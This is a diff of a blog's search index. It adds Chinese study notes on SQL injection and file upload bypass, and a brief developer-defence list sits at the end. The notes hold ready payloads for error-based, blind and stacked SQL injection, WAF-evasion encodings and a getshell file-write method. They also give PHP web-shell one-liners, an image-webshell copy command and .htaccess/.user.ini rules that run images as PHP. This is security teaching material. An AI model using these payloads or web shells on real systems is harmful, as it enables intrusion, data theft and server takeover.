-<h2 id="WAF绕过"><a href="#WAF绕过" class="headerlink" title="WAF绕过"></a>WAF绕过</h2><p><strong>过滤关键内容：</strong></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">and -&gt; &amp;&amp;</span><br><span class="line">or  -&gt; ||</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">空格</span><br><span class="line"></span><br><span class="line">%09 TAB键（水平）</span><br><span class="line">%0a 新建一行</span><br><span class="line">%0c 新的一页</span><br><span class="line">%0d return功能</span><br><span class="line">%0b TAB键（垂直）</span><br><span class="line">%a0 空格</span><br><span class="line">&#x2F;**&#x2F;</span><br></pre></td></tr></table></figure>
-
-<p><strong>长度限制</strong></p>
-<p>(1) regexp() 正则匹配</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">例1：匹配存在f的记录</span><br><span class="line">peri0d&quot;||(updatexml(1,concat(0x3a,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#39;^f&#39;))),1))#</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">例2：匹配存在xxx的字段</span><br><span class="line">username&#x3D;mochu7&quot;||(updatexml(1,concat(0x3a,(select(group_concat(column_name))from(information_schema.columns)where(table_name&#x3D;&#39;users&#39;)&amp;&amp;(column_name)regexp(&#39;^r&#39;))),1))#</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">regexp(&#39;^r&#39;)&#96;是MySql的正则，&#96;^r&#96;匹配开头是r的字段，也就是&#96;column_name&#x3D;real_flag_1s_her</span><br></pre></td></tr></table></figure>
-
-<p>(2) reverse() 逆序函数</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(updatexml(1,concat(0x3a,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#39;^f&#39;)))),1))#</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-<p><strong>关键词限制</strong></p>
-<p>(1)mysqli_real_escape_string() 转义特殊字符</p>
-<p>​        使用16进制绕过 0x75</p>
-<h2 id="不同数据库的检测"><a href="#不同数据库的检测" class="headerlink" title="不同数据库的检测"></a>不同数据库的检测</h2><p>MySQL</p>
-<p>Oracle</p>
-<p>SQLServer</p>
-<p>PostgreSQL</p>
-<h2 id="其他技巧"><a href="#其他技巧" class="headerlink" title="其他技巧"></a>其他技巧</h2><ul>
-<li><p>宽字节注入</p>
-</li>
-<li><p>无列名注入</p>
-</li>
-</ul>
-<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2>]]></content>
-      <categories>
-        <category>Red</category>
-        <category>常见web漏洞</category>
-      </categories>
-      <tags>
-        <tag>web安全</tag>
+        <tag>漏洞复现</tag>
       </tags>
   </entry>
   <entry>
@@ -1401,6 +1036,371 @@
       </categories>
       <tags>
         <tag>web安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>注入</title>
+    <url>/2021/04/30/Red/%E5%B8%B8%E8%A7%81web%E6%BC%8F%E6%B4%9E/%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p>概述：web应用程序对用户<strong>输入数据控制不严格</strong>，导致用户输入数据被<strong>拼接到SQL语句</strong>中被数据库<strong>执行</strong>导致的安全问题。</p>
+<h2 id="注入分类"><a href="#注入分类" class="headerlink" title="注入分类"></a>注入分类</h2><p><strong>按注入方式分类</strong></p>
+<ul>
+<li><p>联合注入：需要内容显示位。</p>
+</li>
+<li><p>报错注入：返回error信息。双查询注入、函数报错 <strong>extractvalue()；updatexml()</strong></p>
+</li>
+<li><p>盲注</p>
+<ul>
+<li>布尔注入：返回页面不同。<strong>异或注入^、’ or ‘1’=’1、三元 if 语句</strong></li>
+<li>时间盲注：界面不更新任何内容，sleep()</li>
+</ul>
+</li>
+<li><p>堆叠注入：</p>
+</li>
+</ul>
+<p><strong>按查询类型分类</strong></p>
+<p>数字型注入、字符型注入、搜索型注入</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">搜索型：select * from 表名 where 字段 like &#39;%关键字%&#39;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>按提交方式注入分类</strong></p>
+<p>GET、POST、Cookie、head头</p>
+<p><strong>按sql语句类型分类</strong></p>
+<p>insert（增）、delete（删）、update（改）、select（查）</p>
+<hr>
+<h2 id="注入检测手法"><a href="#注入检测手法" class="headerlink" title="注入检测手法"></a>注入检测手法</h2><p><strong>注入前的准备工作</strong>（注入点-&gt;输入类型-&gt;回显方式-&gt;未被过滤内容 -&gt;构造闭合）</p>
+<p>（1）找到存在注入漏洞的注入点   【搜索栏/登录框/url地址栏/header头】</p>
+<p>（2）判断输入类型   【字符串/数字类型/搜索型】</p>
+<p>（3）判断其回显方式（找到正确的显示位，根据回显来决定应该选用哪种注入类型）</p>
+<p>（4）判断被过滤的内容  【单双引号/sql语句/<strong>‘</strong> <strong>^ # , ; and union 空格</strong>】</p>
+<p>（5）判断SQL闭合方式</p>
+<h3 id="注入检测"><a href="#注入检测" class="headerlink" title="注入检测"></a>注入检测</h3><p><strong>常见的注入点</strong></p>
+<ul>
+<li>GET/POST/PUT/DELETE参数</li>
+<li>X-Forwarded-For、header头</li>
+<li>文件名</li>
+</ul>
+<p><strong>获取信息</strong></p>
+<ul>
+<li>数据库类型<ul>
+<li><code>and exists (select * from msysobjects ) &gt; 0</code> access数据库</li>
+<li><code>and exists (select * from sysobjects ) &gt; 0</code> SQLServer数据库</li>
+</ul>
+</li>
+<li>版本、主机名、用户名、库名</li>
+<li>表和字段<ul>
+<li>确定字段数<ul>
+<li>Order By</li>
+<li>Select Into</li>
+</ul>
+</li>
+<li>表名、列名</li>
+</ul>
+</li>
+</ul>
+<p><strong>基本查询语句</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">order by n   判断数据库列数</span><br><span class="line">select group_concat(schema_name) from information_schema.schemata  查询数据库</span><br><span class="line">select group_concat(table_name) from information_schema.tables     查询表</span><br><span class="line">select group_concat(column_name) from information_schema.columns   查询字段</span><br><span class="line">select 字段名 from 表名                                				通过表和字段获查询记录</span><br><span class="line">条件：</span><br><span class="line">where table_schema&#x3D;&#39;数据库名&#39;</span><br><span class="line">where table_name&#x3D;&#39;表名&#39;</span><br><span class="line"></span><br><span class="line">关键表：</span><br><span class="line">schema 数据库</span><br><span class="line">table 表</span><br><span class="line">colum 字段</span><br><span class="line">information_schema 提供元数据查询的数据库</span><br><span class="line"></span><br><span class="line">1&#39; and extractvalue(0x0a,concat(0x0a,(database())))#   查询数据库</span><br></pre></td></tr></table></figure>
+
+<p><strong>常用参数</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">version()：MySQL版本</span><br><span class="line">user():数据库用户名</span><br><span class="line">database():数据库名</span><br><span class="line">@@datadir:数据库存储路径</span><br><span class="line">@@basedir：mysql安装路径</span><br><span class="line">@@version_compile_os:操作系统版本</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="详细注入类型"><a href="#详细注入类型" class="headerlink" title="详细注入类型"></a>详细注入类型</h3><h4 id="Fuzz"><a href="#Fuzz" class="headerlink" title="Fuzz"></a>Fuzz</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">or 1&#x3D;</span><br><span class="line">&#39; and &#39;1&#39;&#x3D;&#39;1</span><br><span class="line">+ - ^ * % &#x2F;</span><br><span class="line">&lt;&lt; &gt;&gt; || | &amp; &amp;&amp;</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><p><strong>(1)extractvalue()</strong>    对 xml 文档进行查询的函数，类似于 html 用标签查找元素    查询最大length为32</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">语法：extractvalue(XML_document，XPath_string)</span><br><span class="line">参数1:目标xml文档 参数2:xml路径(XPath语法)   </span><br><span class="line"></span><br><span class="line">利用思路：写入错误的XPath语法时，会返回写入的非法格式内容，</span><br><span class="line"></span><br><span class="line">构造语句：</span><br><span class="line">username&#x3D;admin&#39; union select 1,extractvalue(1,concat(0x7e,(select 语句))) #</span><br><span class="line">0x7e为 ~符号的16进制 用16进制是防止单双引号被过滤问题</span><br><span class="line"></span><br><span class="line">例：and extractvalue(1, concat(0x7e,(select table_name from information_schema.tables limit 1,1)));</span><br><span class="line"></span><br><span class="line">ps：extractvalue()能查询字符串的最大长度为32，可以利用substr进行截取或者利用limit</span><br><span class="line">										 或者使用reverse() 逆序函数</span><br></pre></td></tr></table></figure>
+
+<p><strong>(2)UPDATEXML()</strong>    更新xml文档      查询最大length为32</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">语法：UPDATEXML(XML_document，XPath_string，new_value)</span><br><span class="line">参数1:目标xml文档 参数2:xml路径(XPath语法) 参数3：替换查找到的符合条件的数据</span><br><span class="line"></span><br><span class="line">利用思路：写入错误的XPath语法时，返回写入的非法格式内容</span><br><span class="line"></span><br><span class="line">构造语句：</span><br><span class="line">username&#x3D;admin&#39; union select 1,updatexml(1,concat(0x7e,(sql语句)),1) #</span><br><span class="line">例：</span><br><span class="line">and 1&#x3D;(updatexml(1,concat(0x3a,(select user())),1))</span><br><span class="line"></span><br><span class="line">ps：UPDATEXML()能查询字符串的最大长度为32，可以利用substr进行截取或者利用limit</span><br><span class="line">									  或者使用reverse() 逆序函数</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h4 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h4><p><strong>布尔盲注</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(1)普通布尔盲注：利用ascii(),substr(),二分法查找</span><br><span class="line">	id&#x3D;1&#39; and length(database())&#x3D;8 #</span><br><span class="line">	id&#x3D;1&#39; ascii(substr(database(),1,1))&gt;65</span><br><span class="line"></span><br><span class="line">(2)三元if语句</span><br><span class="line">	id&#x3D;1&#39; or if((select 语句),结果1,结果2) #</span><br><span class="line"></span><br><span class="line">	如果查询条件成立执行结果1,不成立执行结果2</span><br><span class="line">	if((ascii(substr((select 语句,x,1))&gt;x),1,2)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><strong>时间盲注</strong></p>
+<p>涉及：sleep() 、 if(条件, true, false)、mid(str,1,1) 截取、ord(ascii编码)、length</p>
+<p>基础payload：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">x&#x3D;1 and sleep(if((select databse()&#x3D;&#39;xiaodi&#39;),0,5))</span><br><span class="line"></span><br><span class="line">判断表名长度</span><br><span class="line">union select</span><br><span class="line">1,2,3,sleep(if(length(table_name)&#x3D;4,0,5)) from information_schema.tables where table_schema&#x3D;databse() limit 0,1</span><br><span class="line"></span><br><span class="line">判断表名</span><br><span class="line">union select</span><br><span class="line">1,2,3,sleep(if(mid(table_name,1,1)&#x3D;&#39;a&#39;,0,5)) from information_schema.tables where table_schema&#x3D;database() limit 0,1</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;1&#39; or if((select 语句),sleep(2),0)#   如果查询条件成立执行sleep(2),不成立执行0</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">预处理语句使用方式：</span><br><span class="line">SET @sql &#x3D; variable;  &#x2F;&#x2F;设置变量</span><br><span class="line">PREPARE yuchuli from &#39;[my sql sequece]&#39;;   &#x2F;&#x2F;预定义SQL语句</span><br><span class="line">EXECUTE yucrename table &#96;当前表名&#96; to &#96;改后表名&#96;;   &#x2F;&#x2F;修改表名  </span><br><span class="line">		alter table &#96;表名&#96; add(字段名 字段类型 NULL) &#x2F;&#x2F;在表中添加字段</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">模板:</span><br><span class="line">SET @sql &#x3D; 执行语句；	   &#x2F;&#x2F;要执行的sql语句</span><br><span class="line">PREPARE 名称 from @sql；    &#x2F;&#x2F;名称随便取开心就好</span><br><span class="line">EXECUTE 名称；</span><br></pre></td></tr></table></figure>
+
+
+
+<p>利用思路：select查询语句在php代码里已经固定，通过执行堆叠注入将数据库的内容修改掉，使前端执行后的代码是查询我们的目标数据</p>
+<h2 id="注入攻击方向"><a href="#注入攻击方向" class="headerlink" title="注入攻击方向"></a>注入攻击方向</h2><h3 id="读取数据库信息"><a href="#读取数据库信息" class="headerlink" title="读取数据库信息"></a>读取数据库信息</h3><p>version()：MySQL版本<br>user():数据库用户名<br>database():数据库名<br>@@datadir:数据库存储路径<br>@@basedir：mysql安装路径<br>@@version_compile_os:操作系统版本</p>
+<p>数据库名、表名、列名、字段名、记录</p>
+<hr>
+<h3 id="高权限文件操作（Getshell）"><a href="#高权限文件操作（Getshell）" class="headerlink" title="高权限文件操作（Getshell）"></a>高权限文件操作（Getshell）</h3><blockquote>
+<p>读取  写入</p>
+</blockquote>
+<p><font color='red'>mysql注入文件操作：文件操作权限（<strong>root用户</strong>）允许情况下，可以直接写入shell</font></p>
+<p><strong>前置要求：</strong></p>
+<ul>
+<li>路径参数必须为绝对路径</li>
+<li>写入的路径文件可解析，写入位置为 www 网站下</li>
+<li>root权限用户</li>
+</ul>
+<p>读取文件函数：load_file(‘filename’)</p>
+<p>写入文件函数： into out file  ‘filename’</p>
+<p>信息获取</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">获取数据库用户：user</span><br><span class="line">获取操作系统：@@version_compile_os  (在写入文件时会涉及不同系统的特性 例如windows大小写不敏感)</span><br><span class="line">获取路径：@@DATADIR</span><br></pre></td></tr></table></figure>
+
+<p><strong>网站获取路径方法：</strong></p>
+<ul>
+<li><p>报错显示</p>
+</li>
+<li><p>google hacker语法</p>
+<p>inurl: php  warning</p>
+</li>
+<li><p>读取搭建平台的配置文件</p>
+<p>IIS6.0配置路径</p>
+<p>Apache 配置路径</p>
+<p>phpstudy 配置路径</p>
+</li>
+<li><p>漏洞报错</p>
+<p>例如：cms爆路径</p>
+</li>
+<li><p>遗留文件</p>
+<p>说明文件 ；例如 inurl:phpinfo.php</p>
+</li>
+<li><p>字典猜解</p>
+</li>
+</ul>
+<h3 id="高权限跨库注入"><a href="#高权限跨库注入" class="headerlink" title="高权限跨库注入"></a>高权限跨库注入</h3><p>跨库注入条件：root权限</p>
+<p>概述：网站A无注入点，网站B存在mysql注入(root权限用户)，A与B的存在于同一个数据库中，利用网站B注入获取网站A信息</p>
+<p>流程：</p>
+<ul>
+<li>获取所有数据库名</li>
+<li>获取目标数据库名</li>
+<li>执行常规操作获取表名和字段名</li>
+<li>获取相关数据时记得在表名前加上指定的数据库名</li>
+</ul>
+<h2 id="WAF绕过"><a href="#WAF绕过" class="headerlink" title="WAF绕过"></a>WAF绕过</h2><p><strong>过滤关键内容：</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">and -&gt; &amp;&amp;</span><br><span class="line">or  -&gt; ||</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">空格</span><br><span class="line"></span><br><span class="line">%09 TAB键（水平）</span><br><span class="line">%0a 新建一行</span><br><span class="line">%0c 新的一页</span><br><span class="line">%0d return功能</span><br><span class="line">%0b TAB键（垂直）</span><br><span class="line">%a0 空格</span><br><span class="line">&#x2F;**&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p><strong>长度限制</strong></p>
+<p>(1) regexp() 正则匹配</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">例1：匹配存在f的记录</span><br><span class="line">peri0d&quot;||(updatexml(1,concat(0x3a,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#39;^f&#39;))),1))#</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">例2：匹配存在xxx的字段</span><br><span class="line">username&#x3D;mochu7&quot;||(updatexml(1,concat(0x3a,(select(group_concat(column_name))from(information_schema.columns)where(table_name&#x3D;&#39;users&#39;)&amp;&amp;(column_name)regexp(&#39;^r&#39;))),1))#</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">regexp(&#39;^r&#39;)&#96;是MySql的正则，&#96;^r&#96;匹配开头是r的字段，也就是&#96;column_name&#x3D;real_flag_1s_her</span><br></pre></td></tr></table></figure>
+
+<p>(2) reverse() 逆序函数</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(updatexml(1,concat(0x3a,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#39;^f&#39;)))),1))#</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>关键词限制</strong></p>
+<p>(1)mysqli_real_escape_string() 转义特殊字符</p>
+<p>​        使用16进制绕过 0x75</p>
+<h2 id="不同数据库的检测"><a href="#不同数据库的检测" class="headerlink" title="不同数据库的检测"></a>不同数据库的检测</h2><p>MySQL</p>
+<p>Oracle</p>
+<p>SQLServer</p>
+<p>PostgreSQL</p>
+<h2 id="其他技巧"><a href="#其他技巧" class="headerlink" title="其他技巧"></a>其他技巧</h2><ul>
+<li><p>宽字节注入</p>
+</li>
+<li><p>无列名注入</p>
+</li>
+</ul>
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2>]]></content>
+      <categories>
+        <category>Red</category>
+        <category>常见web漏洞</category>
+      </categories>
+      <tags>
+        <tag>web安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>文件上传</title>
+    <url>/2021/04/30/Red/%E5%B8%B8%E8%A7%81web%E6%BC%8F%E6%B4%9E/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
+    <content><![CDATA[<h1 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h1><p><strong>概述</strong>：对用户文件上传的<strong>控制不足</strong>或者<strong>处理缺陷</strong>，导致用户可以越过本身权限向服务器上传<strong>可执行的动态脚本文件</strong>。“文件上传”功能本身没有问题，有问题的是文件上传后，<strong>后端服务器如何处理、解释文件</strong>。</p>
+<h2 id="文件上传攻击的演变"><a href="#文件上传攻击的演变" class="headerlink" title="文件上传攻击的演变"></a>文件上传攻击的演变</h2><ul>
+<li><p>客户端</p>
+<ul>
+<li>前端 JS 校验</li>
+</ul>
+</li>
+<li><p>服务端</p>
+<ul>
+<li>文件后缀校验</li>
+<li>文件类型校验</li>
+<li>文件内容校验</li>
+<li>自定义规则校验</li>
+</ul>
+</li>
+</ul>
+<p>==================</p>
+<p>文件上传测试点 -图片</p>
+<p>===================</p>
+<h2 id="客户端校验（前端）"><a href="#客户端校验（前端）" class="headerlink" title="客户端校验（前端）"></a>客户端校验（前端）</h2><h3 id="JavaScript检查"><a href="#JavaScript检查" class="headerlink" title="JavaScript检查"></a><strong>JavaScript检查</strong></h3><p>​    方法1：浏览器禁js</p>
+<p>​    方法2：burp抓包 先上传白名单文件，再用burp修改上传文件后缀（一句话木马）</p>
+<h2 id="服务端校验（后端）"><a href="#服务端校验（后端）" class="headerlink" title="服务端校验（后端）"></a>服务端校验（后端）</h2><h3 id="文件后缀校验"><a href="#文件后缀校验" class="headerlink" title="文件后缀校验"></a>文件后缀校验</h3><p><strong>黑名单</strong></p>
+<ul>
+<li>大小写绕过</li>
+<li>非黑名单列表爆破</li>
+<li>特殊文件名绕过</li>
+<li>0x00截断绕过</li>
+<li>配合解析漏洞</li>
+<li>双写绕过</li>
+</ul>
+<p><strong>白名单</strong></p>
+<ul>
+<li>0x00截断绕过</li>
+<li>解析漏洞绕过（1.php.jpg）</li>
+<li>.htaccess文件修改配置</li>
+</ul>
+<p>黑名单：寻找漏网之鱼</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-------------------------------------</span><br><span class="line">(1)文件名大小写绕过:Asp Php PHp等等</span><br><span class="line">   只适合windos系统(对大小写不敏感)</span><br><span class="line"></span><br><span class="line"> ### Windows系统下，对于文件名中的大小写不敏感。例如：test.php和TeSt.PHP是一样的。</span><br><span class="line"> ### Linux系统下 test.php和 TesT.php不一样。</span><br><span class="line"></span><br><span class="line">-------------------------------------</span><br><span class="line">(2)非黑名单列表绕过</span><br><span class="line">jsp jspx jspf jspa jsw jsv jtml</span><br><span class="line">asp asa asax cer cdx aspx ascx ashx asmx asp&#123;80-90&#125;</span><br><span class="line">php php1 php2 php3 php4 php5 phtml phtm phps phpt php345 shtml pwml phtm</span><br><span class="line">exe exee vbs asis</span><br><span class="line">inc sh reg cgi exe dll com bat pl cfc cfm ini 等。</span><br><span class="line"></span><br><span class="line">-------------------------------------</span><br><span class="line">(3)系统命名绕过</span><br><span class="line">###利用不符合 windows 系统的格式，但 windows 会自动去除的特性</span><br><span class="line">test.php.			</span><br><span class="line">test.php_(下划线)     </span><br><span class="line">test.php (有空格)     对于文件名中空格会被作为空处理，代码不会删除</span><br><span class="line">php:1.jpg</span><br><span class="line">php::$DATA  # ::$data被当作文件流处理，最后只保留::$DATA之前的文件名以及后缀</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="文件类型校验-MIME验证"><a href="#文件类型校验-MIME验证" class="headerlink" title="文件类型校验(MIME验证)"></a>文件类型校验(MIME验证)</h3><p>只检测数据包 content-type 字段导致的漏洞。（一般是通过后端利用PHP的全局数组 <code>$_FIFS()</code> ，通过<code>_FIFS[&#39;myFile&#39;][&#39;type&#39;]</code> 的获取文件类型）</p>
+<p>攻击手法：抓包修改 content-type 字段</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">image&#x2F;jpeg ：jpg图片格式</span><br><span class="line">   image&#x2F;png  ：png图片格式</span><br><span class="line">   image&#x2F;gif  ：gif图片格式  </span><br><span class="line">   text&#x2F;plain ：纯文本格式   </span><br><span class="line">   text&#x2F;xml   ：  XML格式</span><br><span class="line">   text&#x2F;html  ： HTML格式</span><br><span class="line">   application&#x2F;octet-strea：php格式</span><br><span class="line">   multipart&#x2F;form-data ： 需要在表单中进行文件上传时，就需要使用该格式</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="文件内容校验"><a href="#文件内容校验" class="headerlink" title="文件内容校验"></a>文件内容校验</h3><p>后端代码对上传文件的具体内容进行检测</p>
+<p><strong>检测一：文件头校验</strong></p>
+<ul>
+<li><p><strong>getimagesize() 函数</strong></p>
+</li>
+<li><p><strong>exif_imagetype() 函数</strong></p>
+<blockquote>
+<p>php内置函数，通过读取一个图像的第一个字节并检查其签名 检测其是否为图片类型文件</p>
+</blockquote>
+</li>
+</ul>
+<p>绕过手法：</p>
+<p>（1）添加标志头</p>
+<table>
+<thead>
+<tr>
+<th>类型</th>
+<th>二进制值</th>
+<th>字符串形式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>JPG</td>
+<td>FF D8 FF E0 00 10 4A 46 49 46</td>
+<td>?</td>
+</tr>
+<tr>
+<td>GIF</td>
+<td>47 49 46 38 39 61</td>
+<td>GIF89a</td>
+</tr>
+<tr>
+<td>PNG</td>
+<td>89 50 4E 47</td>
+<td>塒NG</td>
+</tr>
+<tr>
+<td>TIF</td>
+<td>49 49 2A 00</td>
+<td>II*</td>
+</tr>
+<tr>
+<td>BMP</td>
+<td>42 4D</td>
+<td>BM</td>
+</tr>
+</tbody></table>
+<p>（2）制作图片马</p>
+<p>（3）修改配置文件（.htaccess、php.ini）</p>
+<p>（3）预定义高度宽度</p>
+<p>（4）利用<code>x00x00x8ax39x8ax39</code>文件头</p>
+<p>x00x00x8ax30x8ax39 是 wbmp 文件的文件头，但 0x00在 .htaccess 文件中为是注释符，不会影响文件本身。<strong>使用十六进制编辑器或者python的bytes字符类型(b’’)来进行添加。</strong></p>
+<p>payload</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">shell &#x3D; b&quot;\x00\x00\x8a\x39\x8a\x39&quot;+b&quot;00&quot; + &#39;文件内容&#39;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>检测二：内容关键字匹配 &lt;?php ?&gt;</strong></p>
+<p>绕过手法：短标签绕过、编码绕过、版本漏洞</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">适用于PHP5.x版本</span><br><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt;eval($_POST[&#39;cmd&#39;]);&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">短标签</span><br><span class="line">&lt;?&#x3D;@eval($_POST[&#39;abd&#39;]);?&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>检测三：二次渲染</strong></p>
+<p>对上传的图片进行二次修改，删除恶意代码</p>
+<p>绕过手法：</p>
+<p>一般采用上传gif的图片码 (gif较容易)</p>
+<p>寻找二次渲染后文件十六进制 不变的地方</p>
+<p>对gif加入木马代码再次上传</p>
+<h3 id="自定义规则"><a href="#自定义规则" class="headerlink" title="自定义规则"></a>自定义规则</h3><p>对上传的文件进行重命名，隐藏上传路径等等</p>
+<h4 id="通用手法"><a href="#通用手法" class="headerlink" title="通用手法"></a><strong>通用手法</strong></h4><p><strong>（1）图片马</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">copy logo.jpg&#x2F;b+test.php&#x2F;a   test.jpg</span><br></pre></td></tr></table></figure>
+
+<p><strong>（2）配合解析漏洞</strong></p>
+<p><strong>（3）利用配置文件</strong></p>
+<p><strong>.htaccess</strong></p>
+<p>可以实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(1)</span><br><span class="line">&lt;FilesMatch &quot;1.gif&quot;&gt;            #将&quot;1.gif文件解析成php文件 可以通过修改1.gif来变化&quot;</span><br><span class="line">	SetHandler application&#x2F;x-httpd-php</span><br><span class="line">&lt;&#x2F;FilesMatch&gt;</span><br><span class="line"></span><br><span class="line">(2)</span><br><span class="line">AddType application&#x2F;x-http-php .jpg      #将所有jpg文件解析成php文件</span><br></pre></td></tr></table></figure>
+
+<p><strong>.user.ini</strong></p>
+<p>适用 Nginx/apache/IIS，当使用CGI／FastCGI来解析php时，php会优先搜索目录下所有的.ini文件，并应用其中的配置。类似于apache的.htaccess，但语法与.htacces不同，语法跟php.ini一致。</p>
+<p>.user.ini文件内容</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">auto_prepend_file&#x3D;test.jpg</span><br></pre></td></tr></table></figure>
+
+<p>所有的php文件都自动包含test.jpg文件。<code>.user.ini</code>相当于一个用户自定义的<code>php.ini</code>。</p>
+<h4 id="其他技巧"><a href="#其他技巧" class="headerlink" title="其他技巧"></a>其他技巧</h4><blockquote>
+<p>详见在标签文章</p>
+</blockquote>
+<ul>
+<li>竞争上传</li>
+</ul>
+<h2 id="其他绕过手法"><a href="#其他绕过手法" class="headerlink" title="其他绕过手法"></a>其他绕过手法</h2><ul>
+<li>配合文件包含漏洞</li>
+<li>解析漏洞</li>
+<li>OS系统特性</li>
+<li>CMS、编辑器漏洞</li>
+<li>配合其他规则</li>
+<li>WAF绕过</li>
+</ul>
+<h3 id="配合文件包含漏洞"><a href="#配合文件包含漏洞" class="headerlink" title="配合文件包含漏洞"></a>配合文件包含漏洞</h3><p>前提：校验规则只校验当文件后缀名为asp/php/jsp的文件内容是否为木马。</p>
+<p>绕过方式：（此漏洞主要存在PHP中）</p>
+<p>（1）上传内容为木马的txt、jpg图片</p>
+<p>（2）上传具有文件包含功能的php文件</p>
+<h3 id="CMS、编辑器漏洞"><a href="#CMS、编辑器漏洞" class="headerlink" title="CMS、编辑器漏洞"></a>CMS、编辑器漏洞</h3><p>（1）CMS漏洞：比如说JCMS等存在的漏洞，可以针对不同CMS存在的上传漏洞进行绕过。<br>（2）编辑器漏洞：比如FCK，ewebeditor等，可以针对编辑器的漏洞进行绕过。<br>这两方面的漏洞以后单独成文汇总，这里点到为止。</p>
+<h3 id="WAF绕过"><a href="#WAF绕过" class="headerlink" title="WAF绕过"></a>WAF绕过</h3><h2 id="开发人员防御原则"><a href="#开发人员防御原则" class="headerlink" title="开发人员防御原则"></a>开发人员防御原则</h2><hr>
+<p>上传成功+获取路径+解析成功=getshell</p>
+<ul>
+<li><p>隐藏上传文件路径</p>
+</li>
+<li><p>使用配置文件配置web容器不对上传目录下的文件做解析</p>
+</li>
+<li><p>文件后缀名白名单校验</p>
+</li>
+<li><p>上传文件进行重命名(随机)</p>
+</li>
+</ul>
+<p><strong>黑名单</strong></p>
